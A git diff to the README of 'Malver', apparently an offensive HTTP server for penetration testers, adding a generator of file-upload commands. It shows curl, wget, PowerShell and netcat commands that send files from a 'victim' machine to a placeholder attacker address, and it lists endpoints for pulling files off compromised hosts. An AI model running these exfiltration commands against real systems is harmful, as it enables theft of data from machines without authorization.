@@ -4,6 +4,8 @@
 
 Malver (**Mal**icious Ser**ver**) is a lightweight HTTP server designed to simplify common tasks in penetration testing and bug bounty hunting. It allows security researchers to efficiently decode Base64 data, validate blind vulnerabilities, and transfer files to and from a compromised system.
 
+
+
 ## Features
 
 - Base64 Decoding – Quickly decode attacker-controlled data.
@@ -11,6 +13,9 @@ Malver (**Mal**icious Ser**ver**) is a lightweight HTTP server designed to simpl
 - Blind Vulnerability Testing – Use `/` to validate SSRF, RCE, or command injection.
 - Configurable – Customize endpoint paths and directories via CLI.
 - Logging – Outputs structured logs for tracking interactions.
+- Upload Command Generator – Automatically generate ready-to-use upload commands for upload feature.
+
+
 
 ## Endpoints
 
@@ -20,6 +25,7 @@ Malver (**Mal**icious Ser**ver**) is a lightweight HTTP server designed to simpl
 | GET | `/down/{filename}` | Downloads a file from the victim’s machine.|
 | POST | `/up` | Uploads a file from the victim’s machine to the attacker's system.|
 | GET | `/b64d?d=<encoded>` | Decodes Base64-encoded query data.|
+
 
 
 ## Installation
@@ -32,11 +38,15 @@ go install github.com/omarelshopky/malver/cmd@latest
 
 This will install the malver binary in your Go bin directory.
 
+
+
 ## Usage
 
 ```bash
 malver [-port=3000] [-upload=./uploads] [-download=./downloads] [-ping-endpoint=/] [-down-endpoint=/down] [-up-endpoint=/up] [-b64d-endpoint=/b64d]
 ```
+
+
 
 ## Command-Line Flags
 
@@ -49,13 +59,31 @@ malver [-port=3000] [-upload=./uploads] [-download=./downloads] [-ping-endpoint=
 | `-down-endpoint` | `/down/` | Endpoint for file downloads |
 | `-up-endpoint` | `/up` | Endpoint for file uploads |
 | `-b64d-endpoint` | `/b64d` | Endpoint for base64 decoding |
+| `-upload-cmds` | `false` | Generate ready-to-use upload commands |
+| `-ip` | `<ATTACKING_IP>` | Specify the attacker's IP address (used with -upload-commands) |
+| `-file` | `<FILE_PATH>` | Specify the full path of the file to be uploaded (used with -upload-commands) |
+
 
 
 ## Example Use Cases
 
 - Send a request to `/` and check if the target system can reach back.
+- Extract and decode data sent from an exploited machine using `/b64d?q=<encoded>`
+- Retrieving files from a compromised machine using `/down/{filename}` to download files.
+- Upload a shell or tool using the `/up` endpoint. Use `-upload-commands` to generate pre-configured upload commands that can be executed on the victim machine using various built-in tools.
 
-- Upload a shell or tool using the `/up` endpoint.
+
+
+
+### Generating Upload Commands
+
+To quickly generate ready-to-use upload commands, use:
+
+```bash
+malver -upload-commands -ip <ATTACKING_IP> -file <FILE_PATH>
+```
+
+Example output:
 
 > cURL (Multipart Upload)
 
@@ -75,27 +103,24 @@ curl -X POST --data-binary "@<FILE_PATH>" http://<ATTACKING_IP>:3000/up -H "File
 wget --method=POST --body-file=<FILE_PATH> --header="Filename: <FILE_PATH>" --header="Content-Type: application/octet-stream" "http://<ATTACKING_IP>:3000/up"
 ```
 
-> Invoke-WebRequest
+> Invoke-WebRequest (PowerShell)
 
 ```powershell
 Invoke-WebRequest -Uri "http://<ATTACKING_IP>:3000/up" -Method Post -InFile "<FILE_PATH>" -ContentType "application/octet-stream" -Headers @{"Filename"="<FILE_PATH>"}
 ```
 
-> Invoke-RestMethod
+> Invoke-RestMethod (PowerShell)
 
 ```powershell
 Invoke-RestMethod -Uri "http://<ATTACKING_IP>:3000/up" -Method Post -InFile "<FILE_PATH>" -ContentType "application/octet-stream" -Headers @{"Filename"="<FILE_PATH>"}
 ```
 
-> netcat
+> netcat (nc)
 
 ```bash
 (echo -en "POST /up HTTP/1.1\r\nHost: <ATTACKING_IP>:3000\r\nContent-Length: $(wc -c < <FILE_PATH>)\r\nFilename: <FILE_PATH>\r\nContent-Type: application/octet-stream\r\n\r\n"; cat <FILE_PATH>) | nc <ATTACKING_IP> 3000
 ```
 
-- Retrieving files from a compromised machine using `/down/{filename}` to download files.
-
-- Extract and decode data sent from an exploited machine using `/b64d?q=<encoded>`
 
 
 ## Logging
@@ -107,6 +132,7 @@ All requests are logged in the following format:
 ```
 
 This helps track interactions with the server, including query parameters, POST data, and decoded Base64 content.
+
 
 
 ## Disclaimer
